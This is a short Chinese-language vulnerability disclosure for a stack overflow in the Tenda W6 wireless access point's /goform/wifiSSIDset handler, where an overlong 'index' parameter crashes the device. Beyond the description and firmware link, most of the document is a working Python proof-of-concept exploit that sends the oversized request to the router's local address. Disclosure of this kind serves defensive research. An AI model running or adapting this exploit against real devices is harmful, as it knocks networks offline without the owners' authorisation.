# Tenda W6 栈溢出漏洞

## 设备漏洞介绍 
Tenda W6是中国深圳腾达科技（Tenda）公司的一款企业无线AP路由器。

Tenda W6 V1.0.0.9(4122) 版本中的/goform/wifiSSIDset存在栈溢出漏洞，攻击者可利用此漏洞通过index参数导致拒绝服务 (DoS)。

固件下载地址：https://www.tenda.com.cn/download/detail-2576.html

## 漏洞位置
/goform/wifiSSIDset

formwrlSSIDset()函数

![image-20220708155526810](pic/image-20220708155526810.png)

![image-20220708155804797](pic/image-20220708155804797.png)

## Exp

```python
import requests
from pwn import *

burp0_url = "http://192.168.5.1/goform/wifiSSIDset"
burp0_headers = {"Host":"192.168.5.1",
"Content-Length":"295",
"Accept":"*/*",
"X-Requested-With":"XMLHttpRequest",
"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36",
"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
"Origin":"http://192.168.5.1",
"Referer":"http://192.168.5.1/main.html",
"Accept-Encoding":"gzip, deflate",
"Accept-Language":"en-US,en;q=0.9",
"Cookie":"user=",
"Connection":"close"}

data1="index="+'a'*0x200

requests.post(burp0_url,headers=burp0_headers,data=data1, verify=False,timeout=1)

```
## [演示过程请看视频](./video/1.mp4)